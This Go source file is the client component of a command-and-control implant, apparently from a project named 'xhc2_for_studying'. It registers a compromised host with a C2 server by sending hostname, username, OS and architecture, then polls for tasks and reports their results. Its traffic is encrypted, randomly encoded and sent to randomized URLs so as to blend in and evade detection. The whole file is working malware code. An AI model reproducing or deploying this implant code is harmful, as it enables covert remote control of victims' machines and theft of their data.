package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"

	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/implant/identity"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
)

// sendEncrypted encrypts the plaintext, encodes it with a random encoder,
// builds a random URL embedding the encoder negotiation nonce, sends the
// request, and decodes and decrypts the response.
func (c *Client) sendEncrypted(method string, jsonBody []byte, ext string) ([]byte, error) {
	var encodedBody []byte
	var encoderNonce int
	var err error
	if jsonBody != nil {
		encodedBody, encoderNonce, err = c.encryptAndEncode(jsonBody)
		if err != nil {
			return nil, fmt.Errorf("encrypt: %w", err)
		}
	} else {
		enc := protocol.RandomEncoder()
		encoderNonce = protocol.GenerateNonce(enc.ID(), c.c2Profile.EncoderModulus)
	}

	reqURL, err := buildRandomURL(c.baseURL, c.pathPrefix, c.c2Profile, ext)
	if err != nil {
		return nil, fmt.Errorf("build url: %w", err)
	}
	embedEncoderNonce(reqURL, encoderNonce)

	httpReq, err := http.NewRequest(method, reqURL.String(), bytes.NewReader(encodedBody))
	if err != nil {
		return nil, err
	}
	c.applyRequestHeaders(httpReq, jsonBody != nil)

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer func() { _ = resp.Body.Close() }()

	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(rawBody))
	}

	// Decode the response with the same encoder, then decrypt.
	encoderID := protocol.ExtractEncoderID(encoderNonce, c.c2Profile.EncoderModulus)
	enc, ok := protocol.GetEncoderByID(encoderID)
	if !ok {
		return nil, fmt.Errorf("unknown encoder id %d", encoderID)
	}
	decoded, err := enc.Decode(rawBody)
	if err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return c.cipherCtx.Decrypt(decoded)
}

// Register sends a registration request to the C2 server with the host
// information and beacon configuration. It returns the assigned beacon ID.
func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig) (string, error) {
	if c == nil {
		return "", errors.New("client is nil")
	}
	if c.cipherCtx == nil {
		return "", errors.New("cipher context not initialized, call KeyExchange first")
	}

	req := &beaconProtocol.RegisterRequest{
		Hostname: hostInfo.Hostname,
		Username: hostInfo.Username,
		OS:       hostInfo.OS,
		Arch:     hostInfo.Arch,
		Interval: cfg.Interval,
		Jitter:   cfg.Jitter,
	}

	jsonReq, err := json.Marshal(req)
	if err != nil {
		return "", err
	}

	decodedBody, err := c.sendEncrypted(http.MethodPost, jsonReq, c.extMap.Register)
	if err != nil {
		return "", err
	}

	var registerResp beaconProtocol.RegisterResponse
	if err := json.Unmarshal(decodedBody, &registerResp); err != nil {
		return "", err
	}
	if registerResp.BeaconID == "" {
		return "", errors.New("empty beacon id")
	}

	return registerResp.BeaconID, nil
}

// Poll sends a periodic poll request to the C2 server and returns any tasks
// assigned by the server.
func (c *Client) Poll(beaconID string) (*beaconProtocol.PollResponse, error) {
	if c == nil {
		return nil, errors.New("client is nil")
	}
	if c.cipherCtx == nil {
		return nil, errors.New("cipher context not initialized")
	}

	if beaconID == "" {
		return nil, errors.New("beacon id is empty")
	}

	decodedBody, err := c.sendEncrypted(http.MethodGet, nil, c.extMap.Poll)
	if err != nil {
		return nil, err
	}

	var pollResp beaconProtocol.PollResponse
	if err := json.Unmarshal(decodedBody, &pollResp); err != nil {
		return nil, err
	}
	return &pollResp, nil
}

// SubmitResult reports a completed task result to the C2 server.
func (c *Client) SubmitResult(beaconID string, taskResult *protocol.TaskResult) error {
	if c == nil {
		return errors.New("client is nil")
	}
	if c.cipherCtx == nil {
		return errors.New("cipher context not initialized")
	}
	if taskResult == nil {
		return errors.New("task result is nil")
	}

	req := &beaconProtocol.ResultRequest{
		BeaconID:   beaconID,
		TaskResult: *taskResult,
	}
	jsonReq, err := json.Marshal(req)
	if err != nil {
		return err
	}

	decodedBody, err := c.sendEncrypted(http.MethodPost, jsonReq, c.extMap.Result)
	if err != nil {
		return err
	}

	var resultResp beaconProtocol.ResultResponse
	if err := json.Unmarshal(decodedBody, &resultResp); err != nil {
		return err
	}
	if !resultResp.OK {
		return errors.New("result was not acknowledged")
	}
	return nil
}
